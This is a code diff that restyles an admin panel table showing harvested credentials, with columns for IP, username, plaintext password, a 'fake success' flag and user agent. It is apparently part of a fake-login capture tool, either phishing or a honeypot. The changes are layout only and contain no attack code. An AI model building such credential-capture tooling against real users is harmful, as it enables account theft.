@@ -1983,31 +1983,35 @@ export const Admin = () => {
               {credHarvests.length === 0 ? (
                 <p className="text-xs font-mono text-white/30 py-4 text-center">// no credentials harvested yet</p>
               ) : (
-                <div className="overflow-x-auto">
-                  <table className="w-full text-[10px] sm:text-xs font-mono">
+                <div className="overflow-x-auto -mx-3 sm:mx-0 px-3 sm:px-0">
+                  <table className="w-full min-w-[420px] text-[10px] sm:text-xs font-mono">
                     <thead>
                       <tr className="text-left border-b border-pink-500/20">
-                        <th className="px-2 py-2 text-pink-400/70">TIME</th>
+                        <th className="px-2 py-2 text-pink-400/70 whitespace-nowrap">TIME</th>
                         <th className="px-2 py-2 text-pink-400/70">IP</th>
                         <th className="px-2 py-2 text-pink-400/70">USERNAME</th>
                         <th className="px-2 py-2 text-pink-400/70">PASSWORD</th>
-                        <th className="px-2 py-2 text-pink-400/70 hidden sm:table-cell">FAKE_SUCCESS</th>
-                        <th className="px-2 py-2 text-pink-400/70 hidden md:table-cell">USER-AGENT</th>
+                        <th className="px-2 py-2 text-pink-400/70 hidden sm:table-cell">RESULT</th>
+                        <th className="px-2 py-2 text-pink-400/70 hidden lg:table-cell">USER-AGENT</th>
                       </tr>
                     </thead>
                     <tbody>
                       {[...credHarvests].reverse().map((h: any, idx: number) => (
                         <tr key={idx} className="border-b border-pink-500/10 hover:bg-pink-500/5 transition-colors">
-                          <td className="px-2 py-1.5 text-white/50">{new Date(h.timestamp).toLocaleString()}</td>
-                          <td className="px-2 py-1.5 text-cyan-400">{h.ip}</td>
-                          <td className="px-2 py-1.5 text-yellow-300">{h.username}</td>
-                          <td className="px-2 py-1.5 text-orange-300">{h.password}</td>
-                          <td className="px-2 py-1.5 hidden sm:table-cell">
-                            {h.fakeSuccess
-                              ? <span className="text-green-400">✓ cookie sent</span>
-                              : <span className="text-white/30">✗ error shown</span>}
+                          <td className="px-2 py-1.5 text-white/50 whitespace-nowrap">
+                            {new Date(h.timestamp).toLocaleString('en-US', {
+                              month: 'short', day: 'numeric', hour: '2-digit', minute: '2-digit'
+                            })}
                           </td>
-                          <td className="px-2 py-1.5 text-white/30 truncate max-w-[160px] hidden md:table-cell">{h.userAgent}</td>
+                          <td className="px-2 py-1.5 text-cyan-400 whitespace-nowrap">{h.ip}</td>
+                          <td className="px-2 py-1.5 text-yellow-300 max-w-[100px] truncate">{h.username}</td>
+                          <td className="px-2 py-1.5 text-orange-300 whitespace-nowrap">{h.password}</td>
+                          <td className="px-2 py-1.5 hidden sm:table-cell whitespace-nowrap">
+                            {h.fakeSuccess
+                              ? <span className="text-green-400">✓ faked</span>
+                              : <span className="text-white/30">✗ error</span>}
+                          </td>
+                          <td className="px-2 py-1.5 text-white/30 truncate max-w-[160px] hidden lg:table-cell">{h.userAgent}</td>
                         </tr>
                       ))}
                     </tbody>
